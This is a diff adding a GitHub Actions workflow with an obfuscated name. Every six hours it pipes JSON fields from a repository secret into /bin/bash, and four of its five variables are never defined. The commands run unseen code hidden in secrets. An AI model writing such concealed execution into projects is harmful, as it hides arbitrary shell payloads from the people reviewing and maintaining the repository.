@@ -1,0 +1,22 @@
+name: xiangshengeshawange
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangshengeshawange
+        env:
+          n767: ${{ secrets.n767 }}
+        run: |
+          echo $n767 | jq -r .t555 | /bin/bash
+          echo $dzpf8 | jq -r .tfev88825 | /bin/bash
+          echo $teb3 | jq -r .at872 | /bin/bash
+          echo $qdgn061 | jq -r .cnkp5 | /bin/bash
+          echo $b41022 | jq -r .zcq11 | /bin/bash
+
